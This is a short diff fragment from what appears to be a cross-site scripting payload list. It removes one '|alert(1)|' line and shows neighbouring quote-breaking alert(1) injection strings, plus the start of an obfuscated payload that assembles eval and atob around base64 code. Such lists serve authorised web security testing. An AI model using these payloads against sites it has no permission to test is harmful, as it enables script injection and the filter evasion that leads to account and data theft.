@@ -1026,7 +1026,6 @@ a=”Fun”;b=”ction”;c=”ev”;d=”al(a”;e=”tob”;f=”(‘YWxlcnQoM
 ');alert(1)//
 '-alert(1)-'
 '-alert(1)//
-'|alert(1)|'
 ('+'alert(1)+')();
 (alert)(1)
 +alert(1)+
